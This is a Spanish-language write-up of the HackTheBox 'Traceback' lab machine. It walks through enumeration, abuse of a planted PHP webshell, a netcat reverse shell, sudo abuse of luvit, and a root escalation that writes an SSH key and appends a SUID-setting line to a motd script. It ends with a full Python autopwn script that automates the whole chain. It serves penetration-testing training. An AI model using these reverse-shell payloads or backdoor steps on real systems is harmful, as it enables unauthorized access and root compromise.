---
title: "Hackthebox Traceback Writeup (OSCP Style)"
date: 2020-08-13 17:40:34 +/-0800
categories: [Hackthebox,Linux]
tags: [Webshell,Autopwn,Lua,Motd,Python]
image: /assets/img/Post/Traceback.jpg
---

Información de la máquina.

| Contenido | Descripción |
|--|--|
| OS: | ![enter image description here](https://img.icons8.com/color/48/000000/linux.png) |
| Dificultad: | Facil. |
| Puntos: | 20 |
| Lanzamiento: | 14-Marzo-2020 |
| IP: | 10.10.10.181 |
| Primera sangre de usuario: | [sampriti](https://www.hackthebox.eu/home/users/profile/836) |
| Primera sangre de system: | [sampriti](https://www.hackthebox.eu/home/users/profile/836) |

## Enumeración con nmap.

Como siempre comenzaremos con un escaneo a los `65535` puertos con el 
objetivo de poder encontrar cuales son los puertos abiertos.

```
intrusionz3r0@kali:~$ nmap -p- --open -T5 -n -oG nmapScanAllPorts traceback.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 18:56 CDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.20s latency).
Not shown: 53542 closed ports, 11990 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4488/tcp open  awacs-ice

Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
```
Después lanzaré scripts de enumeración básicos para detectar el servicio y la versión de los puertos abiertos.

```
intrusionz3r0@kali:~$ nmap -sCV -p22,80,4488 -oN targeted traceback.htb
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.18s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
4488/tcp open  awacs-ice?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 13 19:02:30 2020 -- 1 IP address (1 host up) scanned in 174.28 seconds
```

El escaneo determinó lo siguiente:

* Puerto 22 `SSH`: Para este puerto no podemos hacer mucho debido a que no contamos con ningunas credenciales aun y ademas la version del servicio no esta asociada a ninguna vulnerabilidad.

* Puerto 4488 `awacs-ice`: Parece ser que los scripts de enumeración no pudieron encontrar con exactitud cual es el servicio que se ejecuta para este puerto.

* Puerto 80 `HTTP`: Nuestro único vector de entrara es el puerto 80, así que vamos a enumerar este servicio.

## Enumeración puerto 80.

Cuando nos dirigimos al servicio HTTP nos encontramos con lo siguiente:

**![](https://lh4.googleusercontent.com/KW-jOo3dcAWt-RSLkrRj_KfkjECXHFpdwZ2OgE70Su_PjQ3tmp91Gpzbs0vlvYhZmXW7FV8UE2V8BNkT7yD67VAzJNBE9K4r4PeA1JULLjy3GmdXzKhy4sWeUphzH23rP9CEO2--)**

Rápidamente utilizo la herramienta `whatweb` para ver que información podemos extraer.

**![](https://lh3.googleusercontent.com/zpnanPw3kZfe_qjyT8D5zPAjMD30qXT2SyNhHhQLXSzHu3ygSPII52y90neg6cZ5F_CyGoTxWVsTQ5fGyG7GGvsMPTMs33H2BFbeNDceMMmp4rzli4m-fgrhYYHiPxLXstwTjlcx)**

Bien, al ver que no logramos extraer información útil, mi siguiente paso es revisar el codigo fuente en busca de pistas ya que esta máquina es muy al estilo CTF.
```html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
 ```
> **Consejo:**  Siempre revisar el código fuente de una máquina en hackthebox debido a que muchas veces encontramos cosas bastante interesantes.

Rápidamente me dirijo a google y hago la siguiente búsqueda:

**![Busqueda en google](https://lh3.googleusercontent.com/G7qTTLjeBBFb6P0YmTx3xHZUWu7ZzOANED1K16jKU8KZwAlfMOgmaWAvt-NLDJ3W6HTdXAVnty7_1qURzuvv0YN-nicEetdESRjAHnb6TUXwoyylY1_au1_Icdgl2uiPIc3Oo3_q)**

**![Página de github](https://lh5.googleusercontent.com/oD3634EatIlLSHq8mFIaThYhKePAZaM6ataSf1_CG7AxlQQ3sgxbpmfc5xmHRrfXxOWiefT8VZV9T_xYALOAeplE4neaVhcc4xrVRlN0BBwv7gP-Vii9YYpxzM3TDCfEoiwg21BL)**


Creo un diccionario con las webshell's que se encuentran aqui para posteriormente realizar un búsqueda de directorios.

## Webshell smevk.php.

```console
intrusionz3r0@kali:~$ wfuzz -c --hc 404 -w dic.txt http://traceback.htb/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://traceback.htb/FUZZ
Total requests: 30

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                             
===================================================================

000000027:   200        58 L     100 W    1261 Ch     "smevk.php"                                                                                         

Total time: 0.817690
Processed Requests: 30
Filtered Requests: 29
Requests/sec.: 36.68870
```
Encontramos `smevk.php`.

**![](https://lh3.googleusercontent.com/i9zR7oMDaEZeGveDHpgxefhfriSCSm8Dh4j75ThE9y_7FHTYgpN_3iTmUYghAHi8cqbPL9yXSxlzXHZuCpnHDTxRR61UaCgPlFhdrkNh2MX2bgoanhFARsZTT21-UnJo3PAcuwY7)**

Reviso el código de [smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php) y encuentro las credenciales de acceso.

```
$UserName = "admin"; //Your UserName here.
$auth_pass = "admin"; //Your Password.
```

Rápidamente utilizo las credenciales para acceder a la webshell.

**![](https://lh5.googleusercontent.com/i50UVMTplYetCaVXNCtDgzvjMIyreh3Y9CdHzZSBSxzigFLCfHH6LdYw15cGUAz5CSJFSHpoIQ4DmA59iPoMpZrjrozczM07v3MncN3WENGdgUovB5S5wP7hS7p3brtBlO95yzOt)**

Hecho un vistazo y me percato de que es posible ejecutar comandos por lo que me lanzo una reverse shell utilizando netcat.

```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PUERTO] >/tmp/f
```

**![](https://lh5.googleusercontent.com/8CZ__2uAbRbZ7ByPO9Jl99uPzNNasTMiFceGYZtKIu1jEz-JDCQNiYC9cm_u_0Ls5DPHl8acuC7TvljxcwZS-Aely8cwYbSJG89QOReKfopYN33RS-H2ZrVO3S6vPek3nFXhkFxH)**

**![](https://lh3.googleusercontent.com/2m5uBVMaatCGJqTMeRloycGhGZjaqQeRiL7vqBgvBCeAE1uB74M92PLORdBcphIYsA3PE9wiZ4P8pd2urieO9E3FF9R53k05Eb7VKaUffhnNLHCm3D0G4VF7giaRfIURtvSR-EYx)**

## Shell como el usuario webadmin.

Me dirijo a mi directorio y encuentro una nota bastante interesante:

> *sysadmin*  
Me ha dejado una herramienta para practicar Lua. 
Estoy seguro de que sabe dónde encontrarla.
Contáctame si tienes alguna pregunta.

Tenemos una pista de por donde va el asunto.

Una de las primeras cosas que hago cuando entro a la máquina es revisar cuales son los comandos que tenemos permitidos ejecutar a nivel usuario.

**![](https://lh5.googleusercontent.com/zxhN1n2FWEdcdXTPaHVZyd8INaEycLP0FGqfxaoPSnEEeeCc5oDvNFPoe-RvQlBpMYDLrVawLl4R3zoSPeU1MAGl-0_V8haZ6IfdK4BA25HdxXZ-VdqGFmrtjXMII8-pKan0bI1T)**
Al parecer podemos ejecutar un binario llamado `luvit` como el usuario `sysadmin`.


**![](https://lh6.googleusercontent.com/qEhH9bY9Hn8Z8ELwvvDNgpcJ8SDHF1uTqWBEfKBLvRaoV6aoGtJejBqcA5ARaQkOGHnSUhuJ-8zloLLaJqDUesTELmlub9NSFRGWU71mOJdB7_dZ-MidC-2Ua96iOkdVgX5iLlVF)**

Si ejecuto el binario luvit podemos observar que este nos va a permitir lograr ejecutar scripts en lua por lo que nuestro objetivo será escalar al usuario `sysadmin` utilizando el lenguaje de scripting lua.

Visito la página: [gtfobins](https://gtfobins.github.io/gtfobins/lua/) para buscar la manera de escalar.

## Shell como el usuario sysadmin.

```
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')"
sysadmin@traceback:/home/webadmin$
```
## Escalar a root via motd.

Eso fue muy fácil, me dirijo a la ruta de `/dev/shm` y me paso un script de enumeración llamado [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration).
**![](https://lh3.googleusercontent.com/zgGuuJQjFTWp4cvFMcku3ljKvsdMM1d81NJ4c4jeU9-W6UboC0rJ0tvO-I0KHSxe0q4ehH7POLL38gQGNZQwJD7GZ1z_5sFn3aEHyLTu7nOkNsS_unZ-Nm5mPrbJOIoO0OTFitLY)**
Bien lo que mas me llama la atención es que nosotros como el usuario `sysadmin` podemos escribir en el archivo motd.

**¿Que es motd?**

Motd es un archivo de unix que su función es enviar un mensaje de bienvenida a todos los usuarios que se conectan al sistema, esto es muy común en autenticación ssh para recibir a los usuario con un mensaje.

si revisamos los permisos:
```console
sysadmin@traceback:/dev/shm$ ls -l /etc/update-motd.d/
total 24
-rwxrwxr-x 1 root sysadmin 1003 Aug 13 17:46 00-header
-rwxrwxr-x 1 root sysadmin  982 Aug 13 17:46 10-help-text
-rwxrwxr-x 1 root sysadmin 4264 Aug 13 17:46 50-motd-news
-rwxrwxr-x 1 root sysadmin  604 Aug 13 17:46 80-esm
-rwxrwxr-x 1 root sysadmin  299 Aug 13 17:46 91-release-upgrade
sysadmin@traceback:/dev/shm$
```
Vemos que efectivamente tenemos permisos de escritura y que ademas el usuario propietario es el usuario `root` por lo que la escalada a root esta bastante regalada.


* Copio mi clave SSH pública y la voy a colocar en el archivo `authorized_keys` del usuario sysadmin.

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ....... intrusionz3r0@Intrusionz3r0" > /home/sysadmin/.ssh/authorized_keys
```

* Después aprovechandonos de que tenemos permisos de escritura en el motd lo modificare para que al final del script me ejecute un comando que me configure el bit SUID al binario `/bin/bash` para que esta se pueda ejecutar como el usuario `root`.

```
sysadmin@traceback:/etc/update-motd.d$ echo "chmod u+s /bin/bash" >> 00-header
```

Ahora solo iniciamos por ssh.

```console
intrusionz3r0@kali:~$  ssh sysadmin@traceback.htb
$ bash -p
```

**![](https://lh5.googleusercontent.com/oKFfbncZH_zEwmajE7HL4z3wTWpx8DNwHhzutN0FFFDGvgxz_vFEcD5XYpf9AGupZmK15C-zNcw7SNTFo3E5NmFfq1vMzs2yAABxtqFy4eiGODuI7xTlNy4JvcKmPeHen4bUAVXl)**

**¡¡Somos root!!**


![enter image description here](https://media.giphy.com/media/l4EpkVLqUj8BI7OV2/giphy.gif)

## Autopwn.

Esto no acaba aquí, vamos a construirnos un autopwn utilizando python. 

Asignamos la cabecera, importamos los paquetes a utilizar y asignamos un puerto con el que vamos a estar trabajando.

```python
#!/usr/bin/env python3
#Author: Intrusionz3r0 
import requests,time,threading,sys,signal
from pwn import *

#Variables Globales 
LPORT=1234
```


Utilizamos la librería `signal` para manejar la salida del programa.
```python
def handler(key,frame):
	print("Adios!!")
	sys.exit(0)

signal = signal.signal(signal.SIGINT,handler)
```

Creamos el siguiente método para poder obtener una shell utilizando la webshell de `smevk.php`.
```python
def getShell(LHOST):

	url = "http://traceback.htb/smevk.php" #Asignamos la url.
	s = requests.session() #Guardamos la sesion.

	p1 = log.progress("Login") 
	data1={ # definimos la data.
		"uname":"admin",
		"pass":"admin",
		"login":"Login"
	}
	p1.status("Ingresando credenciales.")
	time.sleep(4)
	r1 = s.post(url,data=data1) #Enviamos la data para poder loguearnos en el la webshell.
	p1.success("Logueado correctamente.")

	p2 = log.progress("Shell")
	data2={ #Asignamos la data dos para poder enviarnos la revere shell.
		"a":"Console",
		"c":"/var/www/html",
		"p1":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(LHOST,LPORT),
		"p2":"",
		"p3":"",
		"charset":"UTF-8"
	}
	p2.status("Enviando reverse shell, por favor espere.")
	time.sleep(2)
	try:
		r2 = s.post(url,data=data2,timeout=10) #Enviamos la data para obtener una reverse shell.
	except requests.exceptions.Timeout:
		p2.success("Estamos dentro del sistema.")
```

Creamos nuestro método main para manejar el flujo de ejecución.
```python
if __name__ == "__main__":

	if(len(sys.argv) != 2): #Verifico que los argumentos que se le pasen al script sean solo 2 (nombre del script,LHOST)
		log.info("Uso: python {} <LHOST> ; ssh sysadmin@traceback.htb 'bash -p'".format(sys.argv[0]))
		sys.exit(0)

	LHOST = sys.argv[1]

	shell = listen(LPORT,timeout=20)
	try:
		threading.Thread(target=getShell(LHOST)).start() #Ejecuto en hilo el método getShell()
		threading.Thread(target=upServer).start() #De igual manera aquí.
	except Exception as e:
		log.error(str(e))

	if not (shell.sock is None): # Si recibimos una conexión entonces invocamos al método escalarRoot()
		escalarRoot(LHOST)
```

Defino aquí toda la lógica que vimos anteriormente para poder escalar a root.
```python
def escalarRoot(LHOST):
	p3 = log.progress("Root")
	p3.status("Escalando de webmin a sysadmin.")
	shell.sendline(""" sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')" """) # Me convierto en el usuario sysadmin.
	shell.sendline("cd ~/.ssh") #Voy al directorio .ssh del usuario sysadmin.
	time.sleep(2)
	p3.status("Sobreescribiendo clave ssh.")
	shell.sendline("wget http://{}:8000/id_rsa.pub -O authorized_keys".format(LHOST)) #Descargo mi clave publica ssh de mi servidor.
	time.sleep(2)
	os.system("ps -aux | grep  'SimpleHTTPServer' | head -n 1 | awk '{print $2}' | xargs kill") #Mato el proceso del servidor.
	p3.status("Asignando SUID a /bin/bash.")
	time.sleep(3)
	shell.sendline(""" cd /etc/update-motd.d && echo "chmod u+s /bin/bash" >> 00-header """) #Asigno el SUID al binario /bin/bash.
	p3.success("Somos root!!")
	sys.exit(0) #Termino la ejecución del programa.
```

Creo un método para levantar un servidor en mi carpeta .ssh y poder compartir esos archivos.
```python
def upServer():
	os.system("cd ~/.ssh && python -m SimpleHTTPServer 8000 &")
```
Código completo:

```python
#!/usr/bin/env python3
#Author: Intrusionz3r0

import requests,time,threading,sys,signal
from pwn import *

#Variables Globales

LPORT=1234

def handler(key,frame):
	print("Adios!!")
	sys.exit(0)

signal = signal.signal(signal.SIGINT,handler)

def getShell(LHOST):

	url = "http://traceback.htb/smevk.php"
	s = requests.session()

	p1 = log.progress("Login")
	data1={
		"uname":"admin",
		"pass":"admin",
		"login":"Login"
	}
	p1.status("Ingresando credenciales.")
	time.sleep(4)
	r1 = s.post(url,data=data1)
	p1.success("Logueado correctamente.")

	p2 = log.progress("Shell")
	data2={
		"a":"Console",
		"c":"/var/www/html",
		"p1":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(LHOST,LPORT),
		"p2":"",
		"p3":"",
		"charset":"UTF-8"
	}
	p2.status("Enviando reverse shell, por favor espere.")
	time.sleep(2)
	try:
		r2 = s.post(url,data=data2,timeout=10)
	except requests.exceptions.Timeout:
		p2.success("Estamos dentro del sistema.")


def escalarRoot(LHOST):
	p3 = log.progress("Root")
	p3.status("Escalando de webmin a sysadmin.")
	shell.sendline(""" sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')" """)
	shell.sendline("cd ~/.ssh")
	time.sleep(2)
	p3.status("Sobreescribiendo clave ssh.")
	shell.sendline("wget http://{}:8000/id_rsa.pub -O authorized_keys".format(LHOST))
	time.sleep(2)
	os.system("ps -aux | grep  'SimpleHTTPServer' | head -n 1 | awk '{print $2}' | xargs kill")
	p3.status("Asignando SUID a /bin/bash.")
	time.sleep(3)
	shell.sendline(""" cd /etc/update-motd.d && echo "chmod u+s /bin/bash" >> 00-header """)
	p3.success("Somos root!!")
	sys.exit(0)

def upServer():
	os.system("cd ~/.ssh && python -m SimpleHTTPServer 8000 &")

if __name__ == "__main__":

	if(len(sys.argv) != 2):
		log.info("Uso: python {} <LHOST> ; ssh sysadmin@traceback.htb 'bash -p'".format(sys.argv[0]))
		sys.exit(0)

	LHOST = sys.argv[1]

	shell = listen(LPORT,timeout=20)
	try:
		threading.Thread(target=getShell(LHOST)).start()
		threading.Thread(target=upServer).start()
	except Exception as e:
		log.error(str(e))

	if not (shell.sock is None):
		escalarRoot(LHOST)
```

## GIF del autopwn.

![GIF AUTOPWN]({{ "/assets/img/Post/GIFS/traceback.gif" }})



